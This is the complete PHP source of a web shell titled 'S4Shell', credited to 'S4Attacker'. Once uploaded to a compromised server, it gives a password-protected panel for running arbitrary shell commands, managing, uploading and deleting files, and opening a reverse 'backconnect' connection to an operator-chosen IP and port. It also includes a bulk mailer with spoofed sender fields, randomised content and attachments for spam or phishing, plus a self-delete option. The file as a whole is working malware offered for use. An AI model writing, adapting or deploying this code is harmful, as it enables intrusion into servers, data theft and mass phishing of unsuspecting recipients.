<?php
ini_set('max_execution_time', 3600);
ini_set('memory_limit', '-1');
ini_set('mail.add_x_header', 0);
session_start();
$password = "2a002b45afafd4da5ed5033cfd3dc2ae";
if(empty($_SESSION["x"])){
	echo login();
	if(!empty($_POST["password"])){
		if(md5($_POST["password"]) == $password){
			$_SESSION["x"] = md5($_POST["password"]);
			echo '<meta http-equiv="refresh" content="0;URL=\'?php=filemanager&dir=\'">';
		}else{
			$r = 0;
		}
	}
	$r = 0;
}
elseif($_SESSION["x"] == $password){
	$r = 1;
}
else{
	echo login();
	if(!empty($_POST["password"])){
		if(md5($_POST["password"]) == $password){
			$_SESSION["x"] = md5($_POST["password"]);
			echo '<meta http-equiv="refresh" content="0;URL=\'?php=filemanager&dir=\'">';
		}else{
			$r = 0;
		}
	}
	$r = 0;
}
if($r !== 1){
	die();
}
error_reporting(0);
set_time_limit(0);
if(preg_match("/^checkbl$/", $_GET["php"])){
	header('Content-Type: application/javascript');
	if(!empty($_GET["ip"]) && !empty($_GET["host"])){
		checkbl();
		die();
	}else{
		die("Please input valid data!");
	}
}
if( strtolower( substr(PHP_OS,0,3) ) == "win" ){
    $os = 'win';
	$os_shell_platform = "Batch";
	$user_shell = getenv("USERNAME");
}
else{
    $os = 'nix';
	$os_shell_platform = "Bash";
	$user_shell = $_SERVER["USER"];
}
$cwd = @getcwd();
$safe_mode = @ini_get('safe_mode');
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(!empty($_GET['dir'])){
    @chdir($_GET['dir']);
	$cwd = @getcwd();
}
if( strtolower($os) == 'win') {
    $home_cwd = str_replace("\\", "/", $home_cwd);
    $cwd = str_replace("\\", "/", $cwd);
	$cwd = str_replace("//", "\/", $cwd);
}
if(empty($_GET['dir'])){
	$path_links = $cwd;
}
else{
	$path_links = $GLOBALS['cwd'];
}
if(empty($_GET["php"]) || empty($_GET["dir"]) && $_GET["php"] !== "info" && $_GET["php"] !== "mail"){
	header("Location: ?php=filemanager&dir=".$path_links);
}
$cwd_links = '';
$path = explode("/", $path_links);
$n=count($path);
for($i=0;$i<$n;$i++) {
      $cwd_links .= "<a style=\"text-decoration:none;color:lime\"href='?php=filemanager&dir=";
      for($j=0;$j<=$i;$j++)
			$cwd_links .= $path[$j].'/';
        $cwd_links .= "'>".$path[$i]."/</a>";
    }
	
if( $cwd[strlen($cwd)-1] != '/' )
    $cwd .= '/';
    $freeSpace = @diskfreespace($GLOBALS['cwd']);
    $totalSpace = @disk_total_space($GLOBALS['cwd']);
    $totalSpace = $totalSpace?$totalSpace:1;

$os_shell = @php_uname("o");
$os_node_shell = @php_uname("n");
$os_version_shell = @php_uname("v");
$is_writable = is_writable($path_links)?"<font face=\"courier\" size=\"2\" color=green>[ Writeable ]</font>":"<font face=\"courier\" size=\"2\" color=red>[ Not writable ]</font>";
echo "<html>".
	 "<head>".
	 "<title>S4Shell v.1.0.2</title>".
	 "<style>
	body{
		margin:0;
		font-family:'courier new';
	}
	table{
		color:white;
		width:100%;
	}
	a{
		text-decoration:none;
		color: #ffffff;
	}
	a:hover{
		color: #8bc34a;
	}
	a:active{
		color: #ffeb3b;
	}
	.nav{
		background-color: #1c1c1c;
	}
	.nav:hover{
		background-color: #3c3c3c;
	}
	.nav:active{
		background-color: #000000;
	}
	.console{
		color: #ffffff;
		background: #000000;
		border: 1px #6f6f6f solid;
		width: 200px;
	}
	.console::placeholder{
		color: #979797;
	}
	.console:-ms-input-placeholder{
		color: #979797;
	}
	.console::-ms-input-placeholder{
		color: #979797;
	}
	.an1{
		background-color: #171717;
	}
	.an2{
		background-color: #353535;
	}
	.an3{
		background-color: #002735;
	}
	.an4{
		background-color: #04417b;
	}
	.an1:hover,.an2:hover,.an3:hover,.an4:hover{
		background-color: #6c6804;
	}
	button{
		background-color: #000000;
		width:60px;
		border:1px #6f6f6f solid;
		color: lime;
		font-size: 13px;
	}
	button:hover{
		border: 1px #005ebe solid;
	}
	.button{
		background-color: #000000;
		width: 60px;
		border: 1px #6f6f6f solid;
		color: lime;
		font: 400 13.3333px Arial;
		padding: 1px;
		padding-right: 10px;
		padding-left: 10px;
	}
	.button:hover{
		border: 1px #005ebe solid;
	}
	.selectf,
	.selectf:before,
	.selectf:after {
		-webkit-box-sizing: border-box;
		-moz-box-sizing: border-box;
		box-sizing: border-box;
	}
	.file-custom {
		position: absolute;
		top: 0;
		right: 0;
		left: 0;
		z-index: 5;
		font-size: 12px;
		padding: 3px;
		color: #fff;
		background-color: #2c2c2c;
		border: 1px solid #6f6f6f;
		box-shadow: inset 0 0.2rem 0.4rem rgba(0,0,0,.05);
		-webkit-user-select: none;
		-moz-user-select: none;
		-ms-user-select: none;
		user-select: none;
	}
	.file-custom:before {
		position: absolute;
		top: -.075rem;
		right: -.075rem;
		bottom: -.075rem;
		z-index: 6;
		display: block;
		content: \"Browse\";
		padding: 3px;
		color: #0f0;
		background-color: #000;
		border: .075rem solid #6f6f6f;
		border-radius: 0 .25rem .25rem 0;
	}
	.file-custom:after {
		content: \"Choose file\";
	}
	.file input {
		min-width: 200px;
		margin: 0;
		filter: alpha(opacity=0);
		opacity: 0;
	}
	input:focus, textarea:focus, select:focus{
		outline: none;
	}
	.mailer{
		color: white;
		font-size: 12px;
		
	}
	input.mailer{
		border: 1px #616161 solid;
		background-color: black;
		padding: 5px;
		border-left: 0px;
		border-top: 0px;
		border-radius: 5px;
		display: block;
	}
	label.mailer{
		padding-left: 10px;
		display: block;
	}
	td.info{
		display: block;
	}
	.x1{
		font-size: 16px;
		padding-left: 10px;
		padding-bottom: 10px;
		border-bottom: 1px #a3a3a3 solid;
	}
	.green{
		color: green;
	}
	.red{
		color: red;
	}
	</style>".
	 "</head>".
	 "<body bgcolor=\"#00000\"><center><table style='background: #1c1c1c;border-bottom: 1px #797979 solid;'><tr><td>";
echo "<pre style=\"color:#f7f3ef;font-size:11px\">";
echo "OS\t\t: ".$os_shell."<br/>";
echo "Version\t\t: ".$os_version_shell."<br/>";
echo "Hostname\t: ".$os_node_shell."<br/>";
echo "PHP\t\t: ".@phpversion()."<br/>";
echo "HDD\t\t: ".viewSize($freeSpace)."(Free)/".viewSize($totalSpace)."<br/>";
echo "Console\t\t: ".$os_shell_platform."<br/>";
echo "Server IP\t: ".gethostbyname($_SERVER["HTTP_HOST"])."<br/>";
echo "Path\t\t: ".$cwd_links." [".viewPermsColor($path_links)."][ <a href=\"?php=filemanager&dir=\" style=\"text-decoration:none;color:red\">home</a> ]<br/>";
echo "</pre></td></tr><tr style='font-size:12px;'><td>";
echo "|<a href=\"?php=filemanager&dir=".$path_links."\" class='nav'> Home </a>|<a href=\"?php=command&command=help&dir=".$path_links."\" class='nav'> Console </a>|<a href=\"?php=upload&dir=".$path_links."\" class='nav'> Upload </a>|<a href=\"?php=backconnect&dir=".$path_links."\" class='nav'> Backconnect </a>|<a href=\"?php=info\" class='nav'> phpinfo </a>|<a href=\"?php=mail\" class='nav'> Mailer </a>|</td><td style='text-align:right;padding:10px'><a href=\"?php=logout\" class='nav'>[ SignOut ]</a>".
	 "</td></tr></table>";
if(preg_match("/^filemanager$/", $_GET["php"])){
	echo "<table style='padding:10px;border-bottom: 1px #797979 solid;'>";
	echo "<tr>";
	echo "<td style=\"text-align:left;color:#f7f3ef;font-size:12px\">";
	echo "<form ENCTYPE='multipart/form-data' method=\"GET\" style=\"color:#f7f3ef\">";
	echo "<input type=\"hidden\" name=\"php\" value=\"command\">";
	echo $user_shell."@".$os_node_shell.":~$ <input type='hidden' class=\"console\" name=\"dir\" value=\"".$path_links."\" required><input class=\"console\" name=\"command\" placeholder=\"Console\" required><button>enter</button>";
	echo "</form>";
	echo "</td>";
	echo "</tr></table>";
}
if(!empty($_POST['namefile'])){
	if($_GET['php']=="editfile"){
		echo alert("Please close file editing!");
	}
	elseif(!is_file($path_links."/".$_POST['namefile'])){
		file_put_contents($path_links."/".$_POST['namefile'], " ");
		if(is_file($path_links."/".$_POST['namefile']))
		{
			echo alert("Success!");
		}else{
			echo alert("Failed!");
		}
	}
	else{
		echo alert("Failed!");
	}
}

if(!empty($_POST['namedir'])){
	if($_GET['php']=="editfile"){
		echo alert("Please close file editing!");
	}
	elseif(!is_dir($path_links."/".$_POST['namedir'])){
		echo createDir($path_links."/".$_POST['namedir']);
	}
	else{
		echo alert("Directory already exist!");
	}
}
echo "</table>";

echo "<table>";
echo "<tr>";
echo "<td>";
if(!empty($_GET['php'])){
	$php = $_GET['php'];
	if(preg_match("/^filemanager$/", $php)){
		if(!empty($_GET['dir'])){
				$dir = $_GET['dir'];
		}
		else{
			$dir = $GLOBALS['cwd'];
		}
		if(!empty($_GET["dd"]) && !empty($_GET["name"])){
			if(!@rmdir($dir."/".$_GET["name"])){
				echo alert("Failed to delete!\\nDirectory not found, there is a file in the directory or you dont have authorize.");
				echo '<meta http-equiv="refresh" content="0;URL=\'?php=filemanager&dir='.$_GET["dir"].'\'" />';
			}else{
				echo alert("Delete successfully!");
				echo '<meta http-equiv="refresh" content="0;URL=\'?php=filemanager&dir='.$_GET["dir"].'\'" />';
			}
		}elseif(!empty($_GET["df"]) && !empty($_GET["name"])){
			if(!@unlink($_GET["dir"]."/".$_GET["name"])){
				echo alert("Failed to delete!\\nFile not found or you dont have authorize.");
				echo '<meta http-equiv="refresh" content="0;URL=\'?php=filemanager&dir='.$_GET["dir"].'\'" />';
			}else{
				echo alert("Delete successfully!");
				echo '<meta http-equiv="refresh" content="0;URL=\'?php=filemanager&dir='.$_GET["dir"].'\'" />';
			}
		}else{
			echo "<table style=\"font-family:courier;color:white;font-size:12px;\"><tr style=\"background-color:rgba(255, 0, 0, 0.27);text-align:center;\"><td style=\"width:40%\">[ Files ]</td><td style=\"\">[ Time ]</td><td style=\"width:10%\">[ Size ]</td><td style=\"width:10%\">[ Permision ]</td><td style=\"width:10%px\">[ Action ]</td></tr>";
			$files2 = scandir($dir, 1);
			$show_dir = "";
			$show_file= "";
			sort($files2);
			$total_scandir = 0;
			$ocolor_dir = 1;
			$ocolor_file = 3;
			foreach($files2 as $files_list){
				if(preg_match("/^\.$/", $files_list) || preg_match("/^\.\.$/", $files_list)){
				}else{
					if(is_dir($dir."/".$files_list)){
						$show_dir .= "<tr class='an".$ocolor_dir."'><td><a style=\"text-decoration:none;\" href=\"?php=filemanager&dir="
						.$dir."/".$files_list."\">".$files_list."</a></td><td style='text-align:center;'>"
						.date('Y-m-d H:i:s',@filemtime($path_links."/".$files_list))."</td><td style='text-align:center;'>"
						.viewSize(@filesize($path_links."/".$files_list))."</td><td style='text-align:center;'>"
						.viewPermsColor($path_links."/".$files_list)."</td><td style='text-align:center;'>|<a style=\"text-decoration:none;\" href=\"?php=rename&dir="
						.$path_links."/&name=".$files_list."\"> rename </a>|<a style=\"text-decoration:none;\" href=\"?php=filemanager&dir="
						.$path_links."/".$files_list."\"> open </a>|<a style=\"text-decoration:none;\" href=\"?php=filemanager&dd=1&dir="
						.$path_links."&name=".$files_list."\"> delete </a>|</td></tr>";
						if($ocolor_dir < 2){
							$ocolor_dir += 1;
						}else{
							$ocolor_dir = 1;
						}
					}
					else{
						$show_file.= "<tr class='an".$ocolor_file."''><td><a style=\"text-decoration:none;\" href=\"?php=editfile&dir="
						.$path_links."/&name=".$files_list."\">".$files_list."</a></td><td style='text-align:center;'>"
						.date('Y-m-d H:i:s',@filemtime($path_links.$files_list))."</td><td style='text-align:center;'>"
						.viewSize(@filesize($path_links."/".$files_list))."</td><td style='text-align:center;'>"
						.viewPermsColor($path_links."/".$files_list)."</td><td style='text-align:center;'>|<a style=\"text-decoration:none;\" href=\"?php=rename&dir="
						.$path_links."/&name=".$files_list."\"> rename </a>|<a style=\"text-decoration:none;\" href=\"?php=download&dir="
						.$path_links."/".$files_list."\"> download </a>|<a style=\"text-decoration:none;\" href=\"?php=editfile&dir="
						.$path_links."/&name=".$files_list."\"> edit </a>|<a style=\"text-decoration:none;\" href=\"?php=filemanager&df=1&dir="
						.$path_links."&name=".$files_list."\"> delete </a>|</td></tr>";
						if($ocolor_file < 4){
							$ocolor_file += 1;
						}else{
							$ocolor_file = 3;
						}
					}
					$total_scandir += 1;
					
				}
			}
			if($total_scandir >= 1){
			}else{
				echo alert("Empty!");
			}
			echo $show_dir;
			echo $show_file;
			echo "</table></font>";
		}
	}
	elseif(preg_match("/^upload$/", $php)){
		echo "<center><div style='padding:50px'>";
		echo "<table style='width:300px;border: 1px white solid;border-radius: 3px;text-align: center;'><tr><td style='border-bottom:1px white solid;font-size:12px;padding:5px'>";
		echo "Upload Files";
		echo "</td></tr><tr><td style=\"padding:5px\">";
		FileUpload($path_links);
		echo "</td></tr></table>";
		echo "</div></center>";
	}
	elseif(preg_match("/^mail$/", $php)){
		echo "<center><div style='padding:50px'>";
		echo "<table style='width:100%;border: 1px white solid;border-radius: 3px;text-align: left;'>
				<tr>
					<td style='border-bottom:1px white solid;font-size:12px;padding:5px'>";
		echo "Mailer";
		echo "</td></tr><tr><td style=\"padding:5px\">";
		mailer();
		echo "</td></tr></table>";
		echo "</div></center>";
	}
	elseif(preg_match("/^rename$/", $php)){
		echo "<center><div style='padding:50px'>";
		echo "<table style='width:300px;border: 1px white solid;border-radius: 3px;text-align: center;'><tr><td style='border-bottom:1px white solid;font-size:12px;padding:5px'>";
		echo "Rename";
		echo "</td></tr><tr><td style=\"padding:5px\">";
		RenamePath($path_links, $_GET["name"]);
		echo "</td></tr></table>";
		echo "</div></center>";
	}
	elseif(preg_match("/^backconnect$/", $php)){
		echo "<center><div style='padding:50px'>";
		echo "<table style='width:300px;border: 1px white solid;border-radius: 3px;text-align: center;'><tr><td style='border-bottom:1px white solid;font-size:12px;padding:5px'>";
		echo "Backconnect";
		echo "</td></tr><tr><td style=\"padding:5px\">";
		backconnectForm($path_links);
		echo "</td></tr></table>";
		echo "</div></center>";
	}
	elseif(preg_match("/^download$/", $php)){
		if(!empty($_GET['dir'])){
				$dir = $_GET['dir'];
				download($dir);
		}
		else{
			echo alert("File not found!");
		}
	}
	elseif(preg_match("/^editfile$/", $php)){
		if ($edit_file_required = @fopen($_GET['dir'].$_GET['name'], "r")) {
			$content = "";
			while (!feof($edit_file_required)) {
				$content.= htmlentities(str_replace("''", "'", fgets($edit_file_required)));
			}
			@fclose($filez);
			if(!empty($_POST['textfile'])){
				@file_put_contents($_GET['dir'].$_GET['name'], $_POST['textfile']);
				echo alert("Successfully changed files!");
				echo '<meta http-equiv="refresh" content="0;URL=\'?php=filemanager&dir='.$_GET["dir"].'\'" />';
				
			}
			else{
				
			}
			$edit2_file_required = file_get_contents($_GET['dir'].$_GET['name']);
			echo "<form action='?php=editfile&dir=".$_GET['dir']."&name=".$_GET["name"]."' ENCTYPE='multipart/form-data' method=\"POST\"> <textarea style=\"margin:0;background-color:black;width:100%;height:500px;margin:0;color:lime;\" name=\"textfile\">".$content."</textarea><a class='button' href='?php=filemanager&dir=".$_GET['dir']."'>Cancel</a><button>Save</button></form>";

		}
		else{
			echo alert("Failed to open file!");
			echo '<meta http-equiv="refresh" content="0;URL=\'?php=filemanager&dir='.$_GET["dir"].'\'" />';
		}
	}
	elseif(preg_match("/^info$/", $php)){
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace('!body {.*}!msiU','',$tmp);
		$tmp = preg_replace('/width: 934px\;/','',$tmp);
		$tmp = preg_replace('/<a href=\"http\:\/\/www\.php\.net\/\">(.*)<\/a>/','',$tmp);
		$tmp = preg_replace('/<a href=\"http\:\/\/www\.zend\.com\/\">(.*)<\/a>/','',$tmp);
		$tmp = preg_replace('/box-shadow\: 1px 2px 3px \#ccc\;/','',$tmp);
		$tmp = preg_replace('/#99c/','1c1c1c',$tmp);
		$tmp = preg_replace('/#ccf/','#1c1c1c',$tmp);
		$tmp = preg_replace('/#ddd;/','#00000',$tmp);
        $tmp = preg_replace('!a:\w+ {.*}!msiU','',$tmp);
        $tmp = preg_replace('!h1!msiU','h2',$tmp);
        $tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
        $tmp = preg_replace('!body, td, th, h2, h2 {.*}!msiU','',$tmp);
        echo $tmp;
        echo '</div><br>';
	}
	elseif(preg_match("/^remove$/", $php)){
		$remove_shell = @unlink(realpath(__FILE__));
	    if(!$remove_shell){
            echo alert("Failed to delete shell!");
		}
        else{
			echo alert("Thanks for using shell :)");
			die('<meta http-equiv="refresh" content="0;URL=\''.$_SERVER['REQUEST_URI'].'\'" />');
		}
    }
	elseif(preg_match("/^logout$/", $php)){
		session_destroy();
        alert("you are logged out.");
		die('<meta http-equiv="refresh" content="0;URL=\''.$_SERVER['REQUEST_URI'].'\'" />');
    }
	elseif(preg_match("/^command$/", $php)){
		if(!empty($_GET['command'])){
			echo "<pre style=\"color:#f7f3ef\">"."[ ".$os_shell_platform." ]"."</pre>";
			echo "<textarea style=\"background-color:black;width:100%;height:500px;margin:0;color:lime;\" readonly=\"\">";
			$command = $_GET['command'];
			if(preg_match("/^ping .*/", $command)){
				alert("Can't use this command!");
			}
			else{
				$cmd = system($_GET['command']);
				if(!$cmd){
					$cmd_help = system("help");
					if(!$cmd_help){
						alert("Problem with shell!");
					}
					else{
						echo $cmd_help;
					}
				}
				else{
					echo $cmd;
					}
			}
			echo "</textarea>";
			echo "<form ENCTYPE='multipart/form-data' method=\"GET\" style=\"color:#ffffff;font-size:12px;\">";
			echo "<input type=\"hidden\" name=\"php\" value=\"command\">";
			echo $user_shell."@".$os_node_shell.":~$ <input class=\"console\" name=\"dir\" value=\"".$path_links."\" required><input class=\"console\" name=\"command\" placeholder=\"Command\" required><button>enter</button>";
			echo "</form>";
			echo "</pre>";
		}
	}
}

echo "</td>";
echo "</tr></table>";
echo "<table style='background-color:#1c1c1c;border-top: 1px #797979 solid;'><tr><td style='padding-left:50px'>[ create file ] :".$is_writable."<br/><form ENCTYPE='multipart/form-data' method=\"POST\"><input class=\"console\" name=\"namefile\" placeholder=\"\"><button>create</button></form></td><td style=\"padding-top:1px;text-align:right;padding-right:50px\">[ create dir ] :".$is_writable."<br/><form method=\"POST\"><input class=\"console\" name=\"namedir\" placeholder=\"\"/><button>create</button></form></td></tr></table>";
echo 
	 "<div style='font-size:12px;color:#ff0a0a;text-align:right;padding-right:5px'>© 2017-".date("Y")." S4Attacker</div>".
	 "</body>".
	 "</html>";
function viewSize($s) {
    if($s >= 1073741824)
        return sprintf('%1.2f', $s / 1073741824 ). ' GB';
    elseif($s >= 1048576)
        return sprintf('%1.2f', $s / 1048576 ) . ' MB';
    elseif($s >= 1024)
        return sprintf('%1.2f', $s / 1024 ) . ' KB';
    else
        return $s . ' B';
}
function perms($p) {
    if (($p & 0xC000) == 0xC000)$i = 's';
    elseif (($p & 0xA000) == 0xA000)$i = 'l';
    elseif (($p & 0x8000) == 0x8000)$i = '-';
    elseif (($p & 0x6000) == 0x6000)$i = 'b';
    elseif (($p & 0x4000) == 0x4000)$i = 'd';
    elseif (($p & 0x2000) == 0x2000)$i = 'c';
    elseif (($p & 0x1000) == 0x1000)$i = 'p';
    else $i = 'u';
    $i .= (($p & 0x0100) ? 'r' : '-');
    $i .= (($p & 0x0080) ? 'w' : '-');
    $i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
    $i .= (($p & 0x0020) ? 'r' : '-');
    $i .= (($p & 0x0010) ? 'w' : '-');
    $i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
    $i .= (($p & 0x0004) ? 'r' : '-');
    $i .= (($p & 0x0002) ? 'w' : '-');
    $i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
    return $i;
}
function viewPermsColor($f) { 
    if (!@is_readable($f))
        return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
    elseif (!@is_writable($f))
        return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
    else
        return '<font color=#00BB00><b>'.perms(@fileperms($f)).'</b></font>';
}
function FileUpload($path_links){
	echo 	"<form action=\"?php=upload&dir=".$path_links."\" method=\"post\" enctype=\"multipart/form-data\" style=\"color:#f7f3ef;padding:10px;text-align:left\">".
			'<label class="file" style="position: relative;display: inline-block;cursor: pointer;height: 1.5rem;">
				<input type="hidden" name="php" value="upload">
				<input type="file" id="file" name="file" aria-label="File browser">
				<span class="file-custom"></span>
			</label>'.
			"<input class=\"console\" type=\"text\" name=\"dir\" value=\"".$path_links."\">".
			"<button>Upload</button>".
			"</form>";

	if(empty($_FILES["file"])){
	}
	else{
		move_uploaded_file($_FILES["file"]["tmp_name"], $_POST["dir"]."/".$_FILES["file"]["name"]);
		echo alert("Success!\\nPath: ".$_POST["dir"]."/".$_FILES["file"]["name"]);
	}

}
function backconnectForm($path_links){
	if(!empty($_POST["backconnect"])){
		$ipaddress = $_POST["ipaddress"];
		$port = $_POST["port"];
		backconnect();
	}else{
		$ipaddress = "";
		$port = "";
	}
	echo 	"<form action='?php=backconnect&dir=".$path_links."' ENCTYPE=\"multipart/form-data\" method=\"POST\" style=\"color:#f7f3ef;padding:10px;text-align:left\">".
			"<input type=\"hidden\" name=\"backconnect\" value=\"1\">".
			"<table style='font-size:11px;'>".
			"<tr><td>".
			"<label style='display:block'>IP".
			"</td><td>".
			"<input class=\"console\" type=\"text\" name=\"ipaddress\" value=\"".$ipaddress."\" /></label>".
			"</td></tr>".
			"<tr><td>".
			"<label style='display:block'>PORT".
			"</td><td>".
			"<input class=\"console\" type=\"text\" name=\"port\" value=\"".$port."\" /></label>".
			"</td></tr>".
			"<tr><td>".
			"</td><td>".
			"<button style='width:200px' style='display:block'>connect</button>".
			"</td></tr>".
			"</table>".
			"</form>";
}
function RenamePath($path_links, $name){
	echo 	"<form ENCTYPE=\"multipart/form-data\" method=\"GET\" style=\"color:#f7f3ef;padding:10px;text-align:left\">".
			"<span style=\"font-size: 12px\">Path: ".$path_links."/".$name."</span>".
			"<br/><br/>".
			"<input type=\"hidden\" name=\"php\" value=\"rename\">".
			"<input type=\"hidden\" name=\"dir\" value=\"".$path_links."\">".
			"<input type=\"hidden\" name=\"name\" value=\"".$name."\">".
			"<input class=\"console\" type=\"text\" name=\"namechange\" value=\"".$name."\">".
			"<button>Rename</button>".
			"</form>";

	if(empty($_GET["namechange"])){
	}
	else{
		if(rename($path_links."/".$name, $path_links."/".$_GET["namechange"])){
			echo '<meta http-equiv="refresh" content="0;URL=\'?php=filemanager&dir='.$path_links.'\'" />';
		}else{
			echo alert("Failed to change name!");
		}
		
	}

}
function mailer(){
  ob_end_flush();
  ob_implicit_flush();
	if(!empty($_POST["send_it"])){
		$send["from_mail"] = $_POST["from-mail"];
		$send["from_name"] = $_POST["from-name"];
		$send["message_id_domain"] = $_POST["message-id-domain"];
		$send["mailing-list"] = $_POST["mailing-list"];
		$send["alt_body_message"] = $_POST["alt-body-message"];
		$send["main_message"] = $_POST["main_message"];
		$send["subject_message"] = $_POST["subject_message"];
		$send["FileAttachment"] = $_FILES["FileAttachment"];
		$send["fileName"] = $_POST["fileName"];
		$send["Encoding"] = $_POST["Encoding"];
		
	}else{
		$send["from_mail"] = "";
		$send["from_name"] = "";
		$send["message_id_domain"] = "";
		$send["mailing-list"] = "";
		$send["alt_body_message"] = "";
		$send["main_message"] = "";
		$send["subject_message"] = "";
		$send["FileAttachment"] = "";
		$send["fileName"] = "";
		$send["Encoding"] = "quoted-printable";
		
	}
	?>
<table>
	<tr>
		<td style="width:50%">
		<form action="?php=mail&dir=<?php echo $_GET["dir"]; ?>" ENCTYPE="multipart/form-data" method="POST">
		<table>
			<tr>
				<td width="">
					<input type="hidden" name="send_it" value="1"/>
					<label class='mailer'>Email:</label>
					<input class='mailer' placeholder="noreply@s4attacker.com" name="from-mail" value="<?php echo $send["from_mail"]; ?>"/>
					<label class='mailer'>Name:</label>
					<input class='mailer' placeholder="Santiago Uno" name="from-name" value="<?php echo $send["from_name"]; ?>"/>
					<label class='mailer'>Message-ID Domain:</label>
					<input class='mailer' placeholder="example.com" name="message-id-domain" value="<?php echo $send["message_id_domain"]; ?>"/>
					<label class='mailer'>Subject:</label>
					<input class='mailer' placeholder="Subject message" name="subject_message" value="<?php echo $send["subject_message"]; ?>"/>
				</td>
				<td class='info' style="margin:0px">
					<div><label class='mailer' style="display: inline-block;" >Encoding:</label><input style="display: inline-block;" class='mailer' placeholder="Conten-Transfer-Encoding" name="Encoding" value="<?php echo $send["Encoding"]; ?>"/><br/><label class='mailer' style="display: inline-block;" >File:</label><input style="padding:5px" type="file" name="FileAttachment"><label class='mailer' style="display: inline-block;" >FileName:</label><input style="display: inline-block;" class='mailer' placeholder="balblalbla.pdf" name="fileName" value="<?php echo $send["fileName"]; ?>"/>
						<table>
							<tr>
								<td>
									<label class='mailer'>Mailing-List</label>
									<textarea style="background-color:black;width:100%;height:100px;margin:0;color:lime;" name="mailing-list"><?php echo $send["mailing-list"]; ?></textarea>
									<div style="text-align:right">
										<button>Send</button>
									</div>
								</td>
							</tr>
						</table>
					</div>
				</td>
			</tr>
		</table>
		<label class='mailer'>Alt-Body-Message</label>
		<textarea style="background-color:black;width:100%;height:200px;margin:0;color:lime;" name="alt-body-message"><?php echo $send["alt_body_message"]; ?></textarea>
		<label class='mailer'>Main-Message</label>
		<textarea style="background-color:black;width:100%;height:200px;margin:0;color:lime;" name="main_message"><?php echo $send["main_message"]; ?></textarea>
		</td>
		<td style="border: 1px #767676 solid;overflow: scroll;">
			<div style="background-color: black;width: 568px;color: lime;height: 573px;padding: 10px;font-size:12px;font-family: 'Lucida Console';">
				<pre>
<font color='#ff1100'>   __|  | |    \    |    |                |                </font>
<font color='#ff1100'> \__ \ __ _|  _ \    _|   _|   _` |   _|  | /   -_)   _|   </font>
<font color='#ffffff'> ____/   _| _/  _\ \__| \__| \__,_| \__| _\_\ \___| _|     </font>
<font color='#ffffff'>                           copyright © 2013 - <?php echo date("Y"); ?></font>


<a href='?php=mail&dir=<?php echo $_GET["dir"]; ?>&checkbl=1'><font color='#ffffff'>Blacklist Check</font></a>
<?php
	if(!empty($_GET["checkbl"])){
		checkdns();
	}
	elseif(empty($send["from_mail"]) || empty($send["from_name"]) || empty($send["message_id_domain"]) || empty($send["mailing-list"]) || empty($send["main_message"]) || empty($send["Encoding"]) || empty($send["subject_message"]) || empty($_POST["send_it"])){
		mail_guide();
	}else{
		sendmail($send);
	}
?></pre>
			</div>
		</td>
	</tr>
</table>
	</form>
	<?php
}

function send_it($a){
	$uid = md5(uniqid(time()));
	$headers = array();
	$headers[] = "Content-Type: multipart/mixed; boundary=\"===============".$uid."==\"";
	$headers[] = "MIME-Version: 1.0";
	$headers[] = "From: ".command_replace($a["from_name"], $a["mailaddress"])." <".command_replace($a["from_mail"], $a["mailaddress"]).">";
    $headers[] = "Message-ID: ".md5(time())."@".command_replace($a["message_id_domain"], $a["mailaddress"])."";
	
    
	$message = array();
	if(!empty($a["alt_body_message"])){
		$message[] = "===============".$uid."==";
		$message[] = "Content-Type: text/plain; charset=UTF-8";
		$message[] = "Content-Transfer-Encoding: ".$a["Encoding"];
		$message[] = "";
		$message[] = command_replace($a["alt_body_message"], $a["mailaddress"]);
		$message[] = "";
	}
    $message[] = "--===============".$uid."==";
    $message[] = "Content-type:text/html; charset=\"UTF-8\"";
    $message[] = "Content-Transfer-Encoding: ".$a["Encoding"];
	$message[] = "";
    $message[] = command_replace($a["main_message"], $a["mailaddress"]);
	$message[] = "";
    if(!empty($a["FileAttachment"]["name"])){
		if(!empty($send["fileName"])){
			$a["FileAttachment"]["name"] = command_replace($a["fileName"], $a["mailaddress"]);
		}else{
		}
        $message[] = "--===============".$uid."==";
        $message[] = "Content-Type: application/octet-stream; name=\"".$a["FileAttachment"]["name"]."\"";
        $message[] = "Content-Transfer-Encoding: base64";
        $message[] = "Content-Disposition: attachment; filename=\"".$a["FileAttachment"]["name"]."\"";
		$message[] = "";
        $message[] = chunk_split(base64_encode($a["FileAttachment"]["tmp_name"]));
		$message[] = "";
        $message[] = "--===============".$uid."==--";
    }
	return mail($a["mailaddress"], command_replace($a["subject_message"], $a["mailaddress"]), implode("\r\n", $message), implode("\r\n", $headers));
}
function mail_guide(){
	?>
<font color='lime'>
Help for strings.
________________[Random String]________________
##rand-strlowup-(\d{1,2})## -> Random lower and upper character (example: ##rand-strlowup-9## , example2: ##rand-strlowup-99##)
##rand-strlow-(\d{1,2})## -> Random lower character (example: ##rand-strlow-9## , example2: ##rand-strlow-9##)
##rand-strup-(\d{1,2})## -> Random upper character (example: ##rand-strup-9## , example2: ##rand-strup-9##)
##rand-num-(\d{1,2})## -> Random number character (example: ##rand-num-9## , example2: ##rand-num-9##)
##rand-numstrlowup-(\d{1,2})## -> Random lower, upper, and number character (example: ##rand-numstrlowup-9## , example2: ##rand-numstrlowup-9##)
##rand-numstrlow-(\d{1,2})## -> Random number and lower character (example: ##rand-numstrlow-9## , example2: ##rand-numstrlow-9##)
##rand-numstrup-(\d{1,2})## -> Random number and upper character (example: ##rand-numstrup-9## , example2: ##rand-numstrup-9##)

________________[Another Random String]________________
##random-mail## -> Random Email
##random-country## -> Random Country
##random-device## -> Random Device
##randomfrommail## -> Random From EMail
##randomfrommail2## -> Random From EMail2
##random-ip## -> Random Ip Address

________________[Optional String]________________
##time##" -> date("g:i a")
##date##" - date("F j, Y")
##datenum##" -> date("d/m/y")
##fulldate##" -> date("F j, Y, g:i a")
##fulldatenum##" -> date("d/m/y - g:i a")
##ipserver## -> ip address server
##ipclient## -> ip address client
##email## -> to email address

________________[Command Replace Available]________________
